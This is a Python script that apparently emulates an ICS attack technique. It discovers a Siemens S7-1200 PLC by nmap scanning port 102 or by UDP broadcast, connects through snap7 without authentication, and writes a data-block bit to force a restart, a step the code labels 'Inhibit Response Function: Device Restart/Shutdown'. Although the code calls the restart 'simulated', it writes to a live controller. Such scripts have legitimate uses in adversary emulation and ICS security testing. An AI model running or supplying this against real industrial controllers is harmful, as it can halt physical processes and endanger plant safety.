import snap7
import socket
import subprocess
import re
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Siemens S7-1200 PLC connection parameters (default, will be updated)
plc_ip = None  # IP address will be discovered
plc_rack = 0
plc_slot = 1  # Most likely slot number for S7-1200
s7_client = None

# Timeout values
DISCOVERY_TIMEOUT = 5  # Seconds to wait for IP discovery
RESTART_TIMEOUT = 60  # Seconds to wait for restart operation to complete
RETRY_DELAY = 5  # Seconds to wait before retrying connection

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by scanning the network.
    Uses nmap if available, otherwise falls back to a less reliable method.
    """
    global plc_ip

    try:
        # Try using nmap for more reliable discovery
        logging.info("Attempting PLC IP discovery using nmap...")
        process = subprocess.Popen(['nmap', '-p', '102', '-T4', '192.168.0.0/24'], # Replace with your actual network
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate(timeout=DISCOVERY_TIMEOUT)

        if process.returncode == 0:
            output = stdout.decode('utf-8')
            ip_matches = re.findall(r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
            if ip_matches:
                plc_ip = ip_matches[0]
                logging.info(f"PLC IP address found via nmap: {plc_ip}")
                return True
        else:
            logging.warning(f"nmap scan failed with error: {stderr.decode('utf-8')}")

    except FileNotFoundError:
        logging.warning("nmap not found. Using fallback IP discovery method.")
    except subprocess.TimeoutExpired:
        logging.warning("nmap scan timed out. Using fallback IP discovery method.")
    except Exception as e:
        logging.error(f"Error during nmap IP discovery: {e}")

    # Fallback method (less reliable, relies on specific network setup and responses)
    logging.info("Attempting PLC IP discovery using UDP broadcast (fallback)...")
    try:
        # Send a simple broadcast message to port 102 (S7 communication)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(DISCOVERY_TIMEOUT) # Shorter timeout for fallback

        message = b"Are you a Siemens PLC?"
        sock.sendto(message, ('<broadcast>', 102))

        try:
            data, addr = sock.recvfrom(1024)
            plc_ip = addr[0]
            logging.info(f"PLC IP address found via UDP broadcast: {plc_ip}")
            sock.close()
            return True
        except socket.timeout:
            logging.warning("No response from PLC during UDP broadcast.")
            sock.close()
            return False # Discovery failed
    except Exception as e:
        logging.error(f"Error during UDP broadcast IP discovery: {e}")
        return False


def connect_to_plc():
    """
    Connects to the Siemens S7-1200 PLC.
    """
    global s7_client

    try:
        s7_client = snap7.client.Client()
        s7_client.connect(plc_ip, plc_rack, plc_slot)
        logging.info(f"Successfully connected to PLC at {plc_ip}:{plc_rack}:{plc_slot}")
        return True
    except Exception as e:
        logging.error(f"Failed to connect to PLC at {plc_ip}:{plc_rack}:{plc_slot}: {e}")
        s7_client = None  # Ensure client is reset
        return False


def restart_plc():
    """
    Attempts to restart the PLC.  This may require specific privileges or settings on the PLC.
    Requires a connected s7_client.  This implementation simulates a reset, as direct restart commands 
    are not available in the snap7 library without extended functions.

    WARNING: This is a potentially dangerous operation.
    """
    global s7_client

    if s7_client is None or not s7_client.get_connected():
        logging.error("PLC not connected. Cannot restart.")
        return False

    try:
        # Simulate a reset by writing a value to a system bit/flag.
        # This relies on logic programmed in the PLC to trigger a reset sequence.
        # Adjust the address (DB number, byte, bit) according to your PLC program!
        db_number = 10 # Replace with the DB number in your PLC program.
        byte_offset = 0 # Replace with the byte offset within the DB.
        bit_offset = 0  # Replace with the bit offset (0-7).

        # Get data block
        try:
             data = s7_client.db_read(db_number, 0, 1) # read 1 byte
        except Exception as e:
            logging.error(f"Error reading data block {db_number}: {e}")
            return False

        # Set the restart bit
        data_byte = data[0]
        original_byte = data_byte # store the original byte for later resetting the bit
        data_byte |= (1 << bit_offset) # Set the specified bit
        write_data = bytearray([data_byte])
        
        try:
            s7_client.db_write(db_number, 0, write_data)
        except Exception as e:
            logging.error(f"Error writing to data block {db_number}: {e}")
            return False

        logging.warning("Restart signal sent to PLC. Waiting for restart to complete...")
        time.sleep(RESTART_TIMEOUT)

        # Reset the bit to avoid permanent restart loops.  This is critical!
        try:
            # reset original value
            write_data = bytearray([original_byte])
            s7_client.db_write(db_number, 0, write_data)
            logging.info("Restart bit reset in data block.")
        except Exception as e:
            logging.error(f"Error resetting restart bit in data block: {e}")
            return False

        logging.info("PLC restart procedure completed (simulated).")
        return True  # Assuming the reset worked as programmed

    except Exception as e:
        logging.error(f"Error during PLC restart procedure: {e}")
        return False


def main():
    global plc_ip, s7_client

    # 1. Discover the PLC IP address
    if not find_plc_ip():
        logging.error("Failed to discover PLC IP address. Exiting.")
        return

    # 2. Connect to the PLC (with retries)
    retries = 3  # Number of connection attempts
    connected = False
    for i in range(retries):
        if connect_to_plc():
            connected = True
            break
        else:
            logging.warning(f"Connection attempt {i+1} failed. Retrying in {RETRY_DELAY} seconds...")
            time.sleep(RETRY_DELAY)

    if not connected:
        logging.error("Failed to connect to PLC after multiple attempts. Exiting.")
        return

    # 3. Inhibit Response Function: Device Restart/Shutdown
    logging.warning("Initiating simulated PLC Restart (inhibit-response-function).")
    if restart_plc():
        logging.info("Simulated PLC restart initiated successfully.")
    else:
        logging.error("Failed to initiate simulated PLC restart.")

    # 4. Disconnect from the PLC
    if s7_client and s7_client.get_connected():
        s7_client.disconnect()
        logging.info("Disconnected from PLC.")


if __name__ == "__main__":
    main()